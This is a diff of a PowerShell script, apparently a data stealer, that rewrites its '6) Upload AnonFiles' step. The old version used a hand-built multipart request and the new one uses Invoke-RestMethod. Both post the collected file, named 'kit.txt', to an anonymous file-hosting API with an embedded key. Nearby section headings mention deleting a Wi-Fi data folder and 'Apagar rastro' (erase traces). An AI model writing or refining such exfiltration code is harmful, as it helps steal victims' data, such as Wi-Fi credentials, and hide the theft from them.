@@ -80,28 +80,15 @@ Remove-Item $wifiDir -Recurse -Force
 }
 
 # ---------- 6) Upload AnonFiles ----------
-$url  = 'https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d&pretty=true'
-try{
-    $fileBin = [IO.File]::ReadAllBytes($out)
-    $enc     = [System.Text.Encoding]::GetEncoding('ISO-8859-1')
-    $body    = $enc.GetString($fileBin)
-    $boundary= [Guid]::NewGuid().ToString()
-    $LF      = "`r`n"
-    $head    = "--$boundary$LFContent-Disposition: form-data; name=`"file`"; filename=`"kit.txt`"$LFContent-Type: text/plain$LF$LF"
-    $foot    = "$LF--$boundary--$LF"
-    $req     = [System.Net.WebRequest]::Create($url)
-    $req.Method='POST'
-    $req.ContentType="multipart/form-data; boundary=$boundary"
-    $bytes   = [System.Text.Encoding]::UTF8.GetBytes($head+$body+$foot)
-    $req.ContentLength=$bytes.Length
-    $s=$req.GetRequestStream();$s.Write($bytes,0,$bytes.Length);$s.Close()
-    $resp=$req.GetResponse()
-    $sr=New-Object IO.StreamReader($resp.GetResponseStream())
-    $result=$sr.ReadToEnd();$sr.Close();$resp.Close()
-    Write-Host "`nUpload OK – link:" -Fore Green
-    ($result|ConvertFrom-Json).data.file.url.full
-}catch{
-    Write-Host "`nUpload falhou: $($_.Exception.Message)" -Fore Red
+$url = 'https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d&pretty=true'   # endpoint oficial
+try {
+    $res = Invoke-RestMethod -Uri $url -Method Post -Form @{
+        file = Get-Item -LiteralPath $out
+    }
+    Write-Host "`nUpload OK – link:" -ForegroundColor Green
+    $res.data.file.url.full
+} catch {
+    Write-Host "`nUpload falhou: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ---------- 7) Apagar rastro ----------
